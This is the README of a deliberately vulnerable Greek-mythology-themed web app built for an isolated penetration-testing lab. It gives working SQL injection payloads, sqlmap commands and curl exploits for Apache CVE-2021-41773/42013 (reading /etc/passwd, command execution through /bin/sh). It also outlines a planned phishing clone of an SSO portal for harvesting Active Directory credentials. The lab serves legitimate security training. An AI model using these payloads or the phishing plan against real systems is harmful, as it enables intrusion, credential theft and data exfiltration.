# VictimWeb

Themed target web application for an **isolated** cybersecurity lab assessment
(Greek mythology / "House of Hades"). It is served by **Apache 2.4.49** compiled
from source at `/opt/apache-2.4.49` on an Ubuntu VM, backed by **PostgreSQL** for
application data, and authenticated against **Active Directory (SSO)**. Everything
here is deliberately insecure training material.

> **WARNING** — Apache 2.4.49 is vulnerable (CVE-2021-41773 / CVE-2021-42013) and
> the admissions page is intentionally vulnerable to SQL injection. Run this only
> inside a host-only VM. Never expose it to the internet.

---

## Contents

1. [Scenario](#scenario)
2. [Architecture](#architecture)
3. [Attack chain (overview)](#attack-chain-overview)
4. [Repository layout](#repository-layout)
5. [Setup on the Ubuntu VM](#setup-on-the-ubuntu-vm)
6. [Implementation status](#implementation-status)
7. [Exploitation walkthrough](#exploitation-walkthrough)
   - [1. Recon — find the host and the app](#1-recon--find-the-host-and-the-app)
   - [2. Detect the SQL injection](#2-detect-the-sql-injection)
   - [3. Enumerate the schema](#3-enumerate-the-schema)
   - [4. Admissions — UNION-based extraction](#4-admissions--union-based-extraction)
   - [5. The login is not injectable](#5-the-login-is-not-injectable)
8. [From web to internal network](#from-web-to-internal-network)
9. [Apache 2.4.49 (CVE-2021-41773 / 42013)](#apache-2449-cve-2021-41773--42013)
10. [Realism notes](#realism-notes)
11. [Safety notes](#safety-notes)

---

## Scenario

Sisyphus studies his captors to craft an escape. The underworld is connected to
other realms through gateways; compromising the systems that protect them is the
way out. Mythology mapping (from the assessment brief):

| Component | Myth equivalent | Role |
|---|---|---|
| External Kali | Sisyphus | Attacker platform |
| pfSense firewall | The Gates of Tartarus | Segments the network zones |
| Blue Team workstations (Windows) | The Watchers of Tartarus | Internal defenders' machines |
| Splunk | The Oracle of Hades | Security monitoring |
| Vulnerable Linux server (Apache) | The Outer Gatehouse | The system to breach first |

Book colours: Red = Hades, Blue = Zeus, Purple = Kronos.

---

## Architecture

A real web app uses **two separate stores**, and so does this one:

- **Authentication → Active Directory (SSO).** The portal performs an **LDAP bind**
  against a Windows domain controller. One credential logs a warden into the portal
  **and** into their domain-joined Windows workstation. The portal stores no
  passwords, so **there is no SQL injection on the login**.
- **Application data → PostgreSQL.** Holds the staff directory (usernames, emails,
  roles) and the public records. This is what SQL injection loots.

The portal "mixes" the two: it **authenticates against AD** and **reads/writes
application data in PostgreSQL**. SQL injection lives on the data-driven page
(admissions), not on the authentication path.

Network zones (reachability is enforced by the firewall):

```
[ External Kali ]  203.0.113.0/29          <- attacker, outside
        |
[ pfSense firewall ]                        <- segments the zones
        |
   -----+-------------------------------
   |                                   |
[ Apache server ]  10.1.1.0/28     [ Internal network ]  192.168.1.0/24
 "Outer Gatehouse"                   - Windows workstations (domain-joined)
 (reachable from outside)            - Windows Server DC (Active Directory)
                                     - Splunk  192.168.1.6
                                     (NOT reachable from outside)
```

Only the Apache server is exposed. The internal workstations and the DC sit behind
the firewall and are only reachable after gaining a foothold on the gatehouse.

See `docs/active-directory-setup.md` to stand up the DC, create the accounts, join a
workstation, and point the portal at the directory.

---

## Attack chain (overview)

```
1. Recon            nmap + gobuster  ->  find the web app and Apache 2.4.49
2. SQL injection    admissions page  ->  dump the staff directory (usernames, emails)
3. Phishing         fake SSO portal  ->  harvest a real employee's AD credential
4. Breach           Apache CVE (RCE) ->  foothold / pivot into the internal network
5. Lateral move     AD credential    ->  log into the employee's Windows workstation
6. Escalate         local priv-esc   ->  admin / domain
7. Loot / payload   exfiltration + the final staged payload
```

Why both SQL injection **and** the Apache CVE matter, without overlapping:

- **SQL injection gives data, not access** — it reveals *who* the employees are
  (usernames, emails) so you know who to phish. It does not give you a shell.
- **The Apache CVE gives access, not credentials** — it gives code execution /
  a pivot, but not valid accounts for the internal network.
- They combine: the **phished credential** (targeted using the SQLi data) is used
  **from the gatehouse foothold** to move into the internal network.

---

## Repository layout

```
htdocs/           -> /opt/apache-2.4.49/htdocs/     (login.html)
cgi-bin/          -> /opt/apache-2.4.49/cgi-bin/     (login.py, admissions.py)
db/               run on the VM to build the PostgreSQL database
  schema.sql
  setup_db.sh
docs/
  active-directory-setup.md     Windows Server DC + domain join + portal config
deploy.sh         copies htdocs/ and cgi-bin/ into Apache and restarts
```

---

## Setup on the Ubuntu VM

```bash
git clone git@github.com:USERNAME/VictimWeb.git ~/VictimWeb
cd ~/VictimWeb
sudo ./deploy.sh          # web + CGI into Apache
sudo ./db/setup_db.sh     # PostgreSQL + seed data + python3-ldap3 / psycopg2
```

Then set the AD settings in `cgi-bin/login.py` (`AD_HOST`, `AD_DOMAIN`) and follow
`docs/active-directory-setup.md`.

Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute instead
of being downloaded. Apache serves `/opt/apache-2.4.49/cgi-bin/`, which is only
refreshed by `deploy.sh` — a `git pull` alone does not update what Apache runs.

Database summary:
- PostgreSQL, database `underworld`, app role `hades_app` / `styx`
  (over-privileged on purpose so UNION can reach every table).
- Tables: `souls` (public records) and `wardens` (staff directory — **no passwords**).
- Drivers: `python3-psycopg2` (admissions → DB) and `python3-ldap3` (login → AD).

---

## Implementation status

**Built now:**
- Apache 2.4.49 target.
- `admissions.py` — UNION-based SQL injection (public search) → dumps the staff
  directory.
- `login.py` — authenticates via **LDAP bind to Active Directory** (no SQL, not
  injectable). The real portal the phishing clone will imitate.
- PostgreSQL schema + seed data (directory only, no password hashes).
- `docs/active-directory-setup.md` — DC + domain join + portal config guide.

**Planned (next phases):**
- Fake SSO login clone for the phishing phase (credential harvesting).
- Apache CVE exploitation for the foothold, and the pivot into the internal
  network / workstation login with the phished credential.

---

## Exploitation walkthrough

All of this is done remotely over HTTP — no prior access to the server is needed.
The work is **discovering** the app and the injectable parameter, then
**inferring** the query behind it without ever seeing the code.

### 1. Recon — find the host and the app

Find services and the web server:
```bash
nmap -p- -sV -T4 10.1.1.X
```
You see port 80 open and `Server: Apache/2.4.49` — a web server, and already an
old, exploitable version.

You do **not** know `/cgi-bin/admissions.py` exists. Discover content:
```bash
gobuster dir -u http://10.1.1.X -w /usr/share/wordlists/dirb/common.txt -x py,html
```
Also browse the site, read `robots.txt`, page source and `.js` files for endpoints.
This reveals `/cgi-bin/` and the admissions page.

### 2. Detect the SQL injection

You do not know the query. You infer it by poking the input with characters that
are meaningful to SQL and watching whether the response changes in a way that only
makes sense if your input is parsed as SQL.

The admissions `?q=` parameter returns/filters records → something queries a DB.

**a. Break it with a single quote**
```
q=sisyphus'
```
A raw error (e.g. `unterminated quoted string`) means your quote unbalanced a
query → injectable. The error text also fingerprints the engine:
`unterminated quoted string` / `syntax error at or near` → PostgreSQL;
`You have an error in your SQL syntax` → MySQL.

**b. Balance it** (confirm it is SQL syntax, not something else)
```
q=sisyphus''       -> works again (two quotes cancel)
q=sisyphus' --     -> works (comment out the rest)
```

**c. Boolean differential** (works even with no visible error — blind)
```
q=sisyphus' AND '1'='1     -> normal results
q=sisyphus' AND '1'='2     -> no / different results
```
If true vs false changes the output in a SQL-consistent way, it is injectable.

**d. Time-based** (fully blind — no errors, no visible difference)
```
q=x'; SELECT pg_sleep(5)--
```
If the response hangs for 5 seconds, your statement executed.

### 3. Enumerate the schema

You do not know the table `wardens` exists. Ask the database for its own
structure via `information_schema` (the result has 3 columns, matching the
admissions query — see step 4 for how the column count is found).

**List the tables:**
```
zzz' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public' --
```
Reveals `souls` and `wardens`. You discovered `wardens` — you did not guess it.

**List the columns of the interesting table:**
```
zzz' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='wardens' --
```
Reveals `id, username, full_name, email, role, department` (no passwords — auth is AD).

So even a themed, non-obvious name is found: the catalog reveals it.

### 4. Admissions — UNION-based extraction

The admissions page is a **search that displays results**, so UNION is realistic
here: you append a second SELECT and its rows show up in the results table.

Underlying query: `... WHERE full_name ILIKE '%<q>%'`.

**Find the column count** (UNION needs a matching number of columns):
```
zzz' UNION SELECT NULL, NULL, NULL--
```
Three NULLs work; two or four raise "each UNION query must have the same number of
columns" → the result has **3 columns**.

**Dump the staff directory** (the phishing targeting list):
```
zzz' UNION SELECT username, email, role FROM wardens--
```
`full_name ILIKE '%zzz'` matches nothing; the UNION appends every warden row —
usernames, emails and roles. That is the loot: **who to phish and how to reach
them.** There are no passwords here (authentication is AD).

With curl:
```bash
curl -G "http://10.1.1.X/cgi-bin/admissions.py" --data-urlencode "q=sisyphus"
curl -G "http://10.1.1.X/cgi-bin/admissions.py" \
  --data-urlencode "q=zzz' UNION SELECT username, email, role FROM wardens--"
```

**Escalation ladder:**
```
1. q='                                              confirm SQL + engine
2. q=' OR '1'='1' --                                control the logic (dump current table)
3. q=zzz' UNION SELECT NULL,NULL,NULL --            find the column count
4. q=zzz' UNION SELECT table_name,NULL,NULL ...     discover tables (information_schema)
5. q=zzz' UNION SELECT column_name,NULL,NULL ...     discover columns
6. q=zzz' UNION SELECT username,email,role FROM wardens --   extract the directory
```
Note: `' OR '1'='1` only dumps the table the page already queries (`souls`). To
reach **another** table (`wardens`) you need UNION.

### 5. The login is not injectable

The login authenticates with an **LDAP bind to Active Directory** — it runs no SQL,
so none of the techniques above apply to it. That is by design: the login is the
**real portal**, and the next phase builds a **fake copy** of it to phish a warden
(using the emails harvested in step 4). The victim types their AD credential, which
is also their workstation credential.

---

## From web to internal network

The web attack produces **data**; it does not, by itself, put you on the internal
network. The chain closes like this:

1. **SQL injection (admissions)** → the staff directory: usernames and emails.
   This is the *targeting list* for phishing.
2. **Phishing** → a fake copy of the SSO portal is sent to a targeted employee.
   They enter their **real credential** — which, under SSO, is also their Windows /
   network credential. You capture a working credential.
3. **Apache CVE (RCE)** → a foothold on the exposed gatehouse, which can reach the
   internal network. This is the **pivot**.
4. **Lateral movement** → from the foothold, the captured AD credential logs into
   the employee's **Windows workstation** (domain-joined, so the same credential
   works). An employee naturally has an account on their own workstation — which is
   why the credential belongs *there*, not on the DMZ web server.
5. **Privilege escalation** → local/domain escalation to admin.

The Apache RCE lands you as the low-privileged Apache user (e.g. `daemon`), not as
a real user — which is exactly why the phished credential is needed to become a
real user with access, and only then escalate.

---

## Apache 2.4.49 (CVE-2021-41773 / 42013)

Two CVEs affect this version; they are the "Breach of Hades" phase (identify the
old server, exploit a CVE to get in).

- **CVE-2021-41773** — path traversal that can become RCE. Affects **only 2.4.49**;
  partially fixed in 2.4.50.
- **CVE-2021-42013** — the fix for 41773 was incomplete; a double-encoded payload
  bypasses it. Affects **2.4.49 and 2.4.50**; fixed in 2.4.51.

In plain terms they let you do two things:
1. **Read files you shouldn't** (path traversal) — e.g. read system files.
2. **Run commands on the server** (RCE) — only when CGI (`mod_cgi`/`mod_cgid`) is
   enabled, which it is here for the login/admissions scripts.

Example checks (isolated lab only):
```bash
# arbitrary file read (via an alias that grants access, e.g. /icons/)
curl -s --path-as-is "http://10.1.1.X/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# RCE (requires mod_cgi/cgid enabled)
curl -s --path-as-is "http://10.1.1.X/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"
```
The real fix is upgrading to 2.4.51+, which is why this box stays host-only.

---

## Realism notes

- The **methodology** (recon → detect → enumerate schema → extract, or `sqlmap`)
  is exactly how this is done in the real world, and so is the architecture:
  authentication via a central directory (AD/SSO) with the app keeping its own data
  DB.
- The **SQL-injection target is dialled up for learning**: verbose DB errors, raw
  string concatenation, an over-privileged DB role. Modern, well-built apps are
  harder — parameterized queries / ORMs make injection rarer, errors are suppressed
  (forcing blind techniques via `sqlmap`), and a WAF may block obvious payloads.
- SQL injection is still real, especially in **legacy and custom code** and old
  **CGI** scripts with hand-written SQL — precisely this target's profile (old
  Apache + hand-rolled CGI + concatenated SQL). It is a believable legacy system.
- Because auth is AD, the loot from SQL injection is **the directory, not
  passwords** — which is realistic: you phish with the emails rather than cracking
  app hashes.

`sqlmap` automates detection, schema enumeration and extraction:
```bash
sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch --dbs
sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch -D underworld -T wardens --dump
```

---

## Safety notes

- Deliberately insecure training material for a controlled, offline lab.
- Keep the VM on a host-only network; take a snapshot before testing.
- Do not expose the server, and do not store real credentials or personal data.
- Restore the snapshot or delete the VM when the exercise is done.
